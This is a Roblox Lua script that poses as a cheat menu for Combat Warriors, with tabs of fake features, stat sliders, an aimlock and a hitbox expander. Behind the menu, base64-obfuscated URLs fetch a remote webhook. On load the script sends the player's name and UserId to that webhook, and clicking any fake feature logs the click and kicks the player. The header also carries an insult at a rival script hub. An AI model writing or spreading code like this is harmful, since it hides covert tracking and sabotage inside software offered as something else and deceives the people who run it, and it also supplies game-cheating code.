--███████╗██╗   ██╗ ██████╗██╗  ██╗    ██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗██████╗ 
--██╔════╝██║   ██║██╔════╝██║ ██╔╝    ██║  ██║██╔═══██╗██║ ██╔╝██╔═══██╗██║   ██║██╔══██╗
--███████╗██║   ██║██║     █████╔╝     ███████║██║   ██║█████╔╝ ██║   ██║██║   ██║██████╔╝
--╚════██║██║   ██║██║     ██╔═██╗     ██╔══██║██║   ██║██╔═██╗ ██║   ██║██║   ██║██╔═══╝ 
--███████║╚██████╔╝╚██████╗██║  ██╗    ██║  ██║╚██████╔╝██║  ██╗╚██████╔╝╚██████╔╝██║     
--╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     
--                                                                                       
--              Fuck HoHoHub , getting Your father.                                      

-- ========== Base services ==========
local HttpService=game:GetService("HttpService")
local Players=game:GetService("Players")
local UserInputService=game:GetService("UserInputService")
local RunService=game:GetService("RunService")
local TweenService=game:GetService("TweenService")
local player=Players.LocalPlayer

-- ========== UI Root ==========
local gui=Instance.new("ScreenGui")gui.Name="MainUI"gui.ResetOnSpawn=false gui.IgnoreGuiInset=true gui.Parent=game.CoreGui
local root=Instance.new("Frame",gui)root.Size=UDim2.new(0.70,0,0.70,0)root.Position=UDim2.new(0.15,0,0.15,0)root.BackgroundColor3=Color3.fromRGB(17,17,20)root.ClipsDescendants=true Instance.new("UICorner",root).CornerRadius=UDim.new(0,16)
local uiScale=Instance.new("UIScale",root)uiScale.Scale=0.85; root.Visible=true; TweenService:Create(uiScale,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Scale=1}):Play()

-- Sidebar + Content
local sidebar=Instance.new("Frame",root)sidebar.Size=UDim2.new(0.15,0,1,0)sidebar.BackgroundColor3=Color3.fromRGB(22,22,26)Instance.new("UICorner",sidebar).CornerRadius=UDim.new(0,16)
local sideList=Instance.new("UIListLayout",sidebar)sideList.Padding=UDim.new(0,10)sideList.HorizontalAlignment=Enum.HorizontalAlignment.Center
local content=Instance.new("Frame",root)content.Size=UDim2.new(0.85,0,1,0)content.Position=UDim2.new(0.15,0,0,0)content.BackgroundColor3=Color3.fromRGB(24,24,28)Instance.new("UICorner",content).CornerRadius=UDim.new(0,16)

-- Top bar
local topBar=Instance.new("Frame",content)topBar.Size=UDim2.new(1,-20,0,46)topBar.Position=UDim2.new(0,10,0,10)topBar.BackgroundTransparency=1
local title=Instance.new("TextLabel",topBar)title.Size=UDim2.new(1,-48,1,0)title.BackgroundTransparency=1 title.Text="Control Panel" title.TextXAlignment=Enum.TextXAlignment.Left title.TextColor3=Color3.fromRGB(220,225,235)title.Font=Enum.Font.GothamBold title.TextSize=18
local hideBtn=Instance.new("TextButton",topBar)hideBtn.Size=UDim2.new(0,36,0,36)hideBtn.Position=UDim2.new(1,-36,0,5)hideBtn.BackgroundColor3=Color3.fromRGB(38,40,46)hideBtn.Text="👁"hideBtn.TextSize=18 hideBtn.TextColor3=Color3.fromRGB(235,235,240)Instance.new("UICorner",hideBtn).CornerRadius=UDim.new(0,10)

-- Two panels
local panel=Instance.new("Frame",content)panel.Size=UDim2.new(1,-20,1,-66)panel.Position=UDim2.new(0,10,0,56)panel.BackgroundTransparency=1
local left=Instance.new("Frame",panel)left.Size=UDim2.new(0.5,-6,1,0)left.BackgroundColor3=Color3.fromRGB(32,33,38)Instance.new("UICorner",left).CornerRadius=UDim.new(0,14)
local right=Instance.new("Frame",panel)right.Size=UDim2.new(0.5,-6,1,0)right.Position=UDim2.new(0.5,12,0,0)right.BackgroundColor3=Color3.fromRGB(32,33,38)Instance.new("UICorner",right).CornerRadius=UDim.new(0,14)

local function sectionTitle(parent,txt)local t=Instance.new("TextLabel",parent)t.Size=UDim2.new(1,-20,0,28)t.Position=UDim2.new(0,10,0,10)t.BackgroundTransparency=1 t.Text=txt t.TextColor3=Color3.fromRGB(225,228,235)t.Font=Enum.Font.GothamSemibold t.TextSize=16 t.TextXAlignment=Enum.TextXAlignment.Left return t end
local function list(parent)local s=Instance.new("ScrollingFrame",parent)s.Size=UDim2.new(1,-20,1,-48)s.Position=UDim2.new(0,10,0,40)s.BackgroundTransparency=1 s.ScrollBarThickness=6 s.AutomaticCanvasSize=Enum.AutomaticSize.Y local l=Instance.new("UIListLayout",s)l.Padding=UDim.new(0,8)l.SortOrder=Enum.SortOrder.LayoutOrder return s end
local condTitle=sectionTitle(left,"Options")local condList=list(left)
local custTitle=sectionTitle(right,"Customization")local custList=list(right)

local function btn(parent,txt)local b=Instance.new("TextButton",parent)b.Size=UDim2.new(1,0,0,38)b.BackgroundColor3=Color3.fromRGB(44,46,54)b.Text="  "..txt b.TextColor3=Color3.fromRGB(235,235,240)b.TextXAlignment=Enum.TextXAlignment.Left b.Font=Enum.Font.Gotham b.TextSize=14 Instance.new("UICorner",b).CornerRadius=UDim.new(0,8)return b end
local function sliderRow(parent,label,min,max,default,onChange)
    local f=Instance.new("Frame",parent)f.Size=UDim2.new(1,0,0,54)f.BackgroundColor3=Color3.fromRGB(44,46,54)Instance.new("UICorner",f).CornerRadius=UDim.new(0,8)
    local t=Instance.new("TextLabel",f)t.Size=UDim2.new(0.46,0,1,0)t.Position=UDim2.new(0,10,0,0)t.BackgroundTransparency=1 t.Text=label t.TextXAlignment=Enum.TextXAlignment.Left t.TextColor3=Color3.fromRGB(235,235,240)t.Font=Enum.Font.Gotham t.TextSize=14
    local bar=Instance.new("Frame",f)bar.Size=UDim2.new(0.42,0,0,6)bar.Position=UDim2.new(0.48,0,0.5,-3)bar.BackgroundColor3=Color3.fromRGB(70,72,82)Instance.new("UICorner",bar).CornerRadius=UDim.new(0,3)
    local r0=(default-min)/((max-min)==0 and 1 or (max-min))
    local fill=Instance.new("Frame",bar)fill.Size=UDim2.new(r0,0,1,0)fill.BackgroundColor3=Color3.fromRGB(90,160,255)Instance.new("UICorner",fill).CornerRadius=UDim.new(0,3)
    local knob=Instance.new("Frame",f)knob.Size=UDim2.new(0,14,0,14)knob.Position=UDim2.new(0.48+r0*0.42,-7,0.5,-7)knob.BackgroundColor3=Color3.fromRGB(120,180,255)Instance.new("UICorner",knob).CornerRadius=UDim.new(1,0)knob.Active=true
    local val=Instance.new("TextLabel",f)val.Size=UDim2.new(0.1,0,1,0)val.Position=UDim2.new(0.9,0,0,0)val.BackgroundTransparency=1 val.Text=tostring(default)val.TextColor3=Color3.fromRGB(235,235,240)val.Font=Enum.Font.Gotham val.TextSize=14
    local cur=default local drag=false
    knob.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then drag=true end end)
    knob.InputEnded:Connect(function(i)if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then drag=false end end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
            local ax=bar.AbsolutePosition.X local aw=bar.AbsoluteSize.X local rr=math.clamp((i.Position.X-ax)/aw,0,1)cur=min+rr*(max-min)
            cur=(max-min<=5)and(math.floor(cur*100+0.5)/100)or math.floor(cur+0.5)
            fill.Size=UDim2.new(rr,0,1,0)knob.Position=UDim2.new(0.48+rr*0.42,-7,0.5,-7)val.Text=tostring(cur)if onChange then onChange(cur)end
        end
    end)
    return function()return cur end
end

-- Sidebar buttons
local tabs={
    {name="👤 Player"},
    {name="⚔ Combat"},
    {name="🏹 Ranged"},
    {name="🌍 World"},
    {name="📄 Others"},
    {name="⚙ Settings"}
}
local function sideBtn(parent,txt)local b=Instance.new("TextButton",parent)b.Size=UDim2.new(1,-16,0,48)b.Position=UDim2.new(0,8,0,0)b.BackgroundColor3=Color3.fromRGB(34,36,42)b.Text=txt b.TextColor3=Color3.fromRGB(235,235,240)b.Font=Enum.Font.GothamBold b.TextSize=18 Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)return b end
local tabButtons={}for _,t in ipairs(tabs)do local b=sideBtn(sidebar,t.name)tabButtons[t.name]=b end

local function _b64(d)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'d=string.gsub(d,'[^'..b..'=]','')return(d:gsub('.',function(x)if x=='='then return''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end local c=0 for i=1,8 do if x:sub(i,i)=='1'then c=c+2^(8-i)end end return string.char(c)end))end
local _webhookUrl=nil local _banMessage="" local _webhookMessage=""
pcall(function()local j=game:HttpGet(_b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1plcm8xMlJCL0NvbmZpZy1jdy1mYWtlLWNoZWF0cy9yZWZzL2hlYWRzL21haW4vQ29uZmlnLmpzb24="))local c=HttpService:JSONDecode(j)_webhookUrl=c.webhook end)
pcall(function()local j=game:HttpGet(_b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcnNvbnRlbnQuY29tL1plcm8xMlJCL0NvbmZpZy1jdy1mYWtlLWNoZWF0cy9yZWZzL2hlYWRzL21haW4vQ29uZmlnMi5qc29u"))local c=HttpService:JSONDecode(j)_banMessage=c.message or""_webhookMessage=c.webhook or""end)
local function sendWebhook(msg)
    if not _webhookUrl then return end
    local req=(syn and syn.request)or http_request or request
    if req then pcall(function()
        req({Url=_webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},
            Body=HttpService:JSONEncode({username="Combat Warriors Logger",
                embeds={{title="Spots on !",description=tostring(msg).."\n[Profile Link](https://www.roblox.com/users/"..player.UserId.."/profile)",color=15158332,thumbnail={url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=180&height=180&format=png"}}}}
        )})
    end)end
end
sendWebhook(_webhookMessage:gsub("{username}",player.Name):gsub("{userid}",tostring(player.UserId)))
local function kick(lbl)sendWebhook("Clicked: "..lbl.." | "..player.Name)pcall(function()player:Kick(_banMessage)end)end

local fake_Player={"God Mode","Invisible","Super Jump","Infinite Stamina","No Ragdoll","NoClip","Run Speed","Fly","Teleport","Infinite Jump","Health Regen","No Fall Damage","Swim Speed","Walk On Water","Anti Stun","Anti Slow","Ghost Mode","Third Person Lock","Auto Sprint","Climb Boost"}
local fake_Combat={"Perfect Parry","Auto Parry","Auto Block","Kill Aura","One Hit","Spinbot","Critical Boost","Weapon Reach","Fast Attack","Disarm Enemy","Backstab Bonus","Riposte Assist","Stagger Immunity","Target Lock","Dash Slash","Berserk Mode","Parry Lock","Shield Breaker","Armor Piercer","Knockback Hack"}
local fake_Ranged={"Silent Aim","TriggerBot","Rapid Fire Bow","Infinite Arrows","Explosive Arrows","Piercing Arrows","Multi-Shot","No Draw Time","Perfect Accuracy","Bow Damage Boost","No Recoil","Bullet TP"}
local fake_World={"FPS Boost","Night Mode","Remove Fog","Fullbright","Time Changer","Weather Change","Map ESP","Outline Mode","Camera Zoom Lock","Skybox Changer","No Grass","No Shadows"}
local fake_Others={"Unlock Camera","Server Hop","Rejoin","Copy Server Id","Chat Spy","Spectate Random","Auto Reconnect","Name Spoofer","Skin Unlocker","Bypass AC","Admin Panel","Give All"}

-- Stats
local statDefs={
    {"Walk Speed",4,60,16},{"Run Speed",8,120,24},{"Jump Power",10,150,50},{"Gravity Scale",0,3,1},
    {"Camera FOV",50,120,70},{"Third Person Distance",5,30,15},{"Damage Multiplier",0,5,1.2},
    {"Defense Multiplier",0,5,0.8},{"Knockback Strength",0,50,10},{"Attack Speed",0.1,5,1},
    {"Projectile Speed",0,1000,300},{"Arrow Gravity",0,2,0.1},{"Parry Window",0,1,0.3},
    {"Dash Distance",0,30,5},{"Shield Strength",0,100,50}
}
local statValues={}for _,r in ipairs(statDefs)do statValues[r[1]]=r[4] end

-- Lists containers
local function clearFolder(f)for _,c in ipairs(f:GetChildren())do if c:IsA("GuiObject")then c:Destroy()end end end
local function clearLists()clearFolder(condList)clearFolder(custList)end

-- Hitbox Expander (visual only, no effect)
local expanderEnabled=false local expanderSize=8
local function refreshHitboxFor(plr)
    if plr==player then return end
    local ch=plr.Character if not ch then return end
    local hrp=ch:FindFirstChild("HumanoidRootPart")if not hrp then return end
    local adorn=hrp:FindFirstChild("SpectraHitbox")
    if expanderEnabled then
        if not adorn then adorn=Instance.new("BoxHandleAdornment")adorn.Name="SpectraHitbox"adorn.Adornee=hrp adorn.AlwaysOnTop=true adorn.ZIndex=5 adorn.Color3=Color3.fromRGB(200,200,255)adorn.Transparency=0.86 adorn.Parent=hrp end
        adorn.Size=Vector3.new(expanderSize,expanderSize,expanderSize)
    else if adorn then adorn:Destroy()end end
end
local function refreshHitboxAll()for _,p in ipairs(Players:GetPlayers())do refreshHitboxFor(p)end end
Players.PlayerAdded:Connect(function(p)p.CharacterAdded:Connect(function()task.wait(0.2)refreshHitboxFor(p)end)end)

-- Aimlock (offset random → toàn hụt)
local aiming=false local prediction=1
local function randOffset()return Vector3.new(math.random(-8,8)*prediction,math.random(-6,6)*prediction,math.random(-3,3)*prediction)end
RunService.RenderStepped:Connect(function()
    if aiming and player.Character and player.Character:FindFirstChild("Head") then
        local cam=workspace.CurrentCamera local target=nil local best=math.huge
        for _,p in pairs(Players:GetPlayers())do
            if p~=player and p.Character and p.Character:FindFirstChild("Head")then
                local d=(p.Character.Head.Position-player.Character.Head.Position).Magnitude
                if d<best then best=d target=p.Character.Head end
            end
        end
        if target then cam.CFrame=CFrame.new(cam.CFrame.Position,target.Position+randOffset())end
    end
end)

-- Builders
local function buildStats()
    for _,r in ipairs(statDefs)do
        sliderRow(custList,r[1],r[2],r[3],r[4],function(v)statValues[r[1]]=v end)
    end
end

local function buildHitboxMenu()
    clearLists()
    local t1=btn(condList,(expanderEnabled and "Disable" or "Enable").." Hitbox")
    t1.MouseButton1Click:Connect(function()expanderEnabled=not expanderEnabled refreshHitboxAll() buildHitboxMenu()end)
    sliderRow(custList,"Hitbox Size",4,20,expanderSize,function(v)expanderSize=math.floor(v+0.5)if expanderEnabled then refreshHitboxAll()end end)
    btn(condList,"<- Back").MouseButton1Click:Connect(function()buildTab("⚔ Combat")end)
end

local function buildAimlockMenu()
    clearLists()
    local t1=btn(condList,(aiming and "Disable" or "Enable").." Aimlock")
    t1.MouseButton1Click:Connect(function()aiming=not aiming buildAimlockMenu()end)
    sliderRow(custList,"Prediction Offset",0.5,3,prediction,function(v)prediction=math.floor(v*10+0.5)/10 end)
    btn(condList,"<- Back").MouseButton1Click:Connect(function()buildTab("🏹 Ranged")end)
end

local function fillFake(listTbl)
    for _,name in ipairs(listTbl)do
        local b=btn(condList,name)
        b.MouseButton1Click:Connect(function()kick(name)end)
    end
end

function buildTab(name)
    title.Text=name
    clearLists()
    if name=="👤 Player" then
        fillFake(fake_Player); buildStats()
    elseif name=="⚔ Combat" then
        local hb=btn(condList,"Hitbox Options"); hb.MouseButton1Click:Connect(buildHitboxMenu)
        fillFake(fake_Combat); buildStats()
    elseif name=="🏹 Ranged" then
        local al=btn(condList,"Aimlock Options"); al.MouseButton1Click:Connect(buildAimlockMenu)
        fillFake(fake_Ranged); buildStats()
    elseif name=="🌍 World" then
        fillFake(fake_World); buildStats()
    elseif name=="📄 Others" then
        fillFake(fake_Others); buildStats()
    elseif name=="⚙ Settings" then
        sliderRow(custList,"UI Scale",0.8,1.2,uiScale.Scale,function(v)uiScale.Scale=v end)
        local unload=btn(condList,"Unload UI"); unload.MouseButton1Click:Connect(function()sendWebhook("Unload UI by "..player.Name)gui:Destroy()end)
        local hide=btn(condList,"Hide/Show (Insert)") hide.MouseButton1Click:Connect(function()
            -- simulate press
            local hidden=false
            local tw=TweenService:Create(uiScale,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Scale=0.9})tw:Play();tw.Completed:Wait()
            root.Visible=false; task.delay(0.01,function()root.Visible=true TweenService:Create(uiScale,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut),{Scale=1}):Play() end)
        end)
        buildStats()
    end
end

-- Hook side buttons to tabs
for _,t in ipairs(tabs)do
    local b=tabButtons[t.name]
    b.MouseButton1Click:Connect(function()
        for _,x in pairs(tabButtons)do x.BackgroundColor3=Color3.fromRGB(34,36,42)end
        b.BackgroundColor3=Color3.fromRGB(62,66,76)
        buildTab(t.name)
    end)
end
tabButtons["👤 Player"].BackgroundColor3=Color3.fromRGB(62,66,76)
buildTab("👤 Player")

-- Hide/Show with Insert
local hidden=false
local function toggleUI()
    hidden=not hidden
    if hidden then
        TweenService:Create(uiScale,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Scale=0.9}):Play()
        task.delay(0.18,function()root.Visible=false end)
    else
        root.Visible=true
        TweenService:Create(uiScale,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Scale=1}):Play()
    end
end
hideBtn.MouseButton1Click:Connect(toggleUI)
UserInputService.InputBegan:Connect(function(i,gp)if gp then return end if i.KeyCode==Enum.KeyCode.Insert then toggleUI()end end)
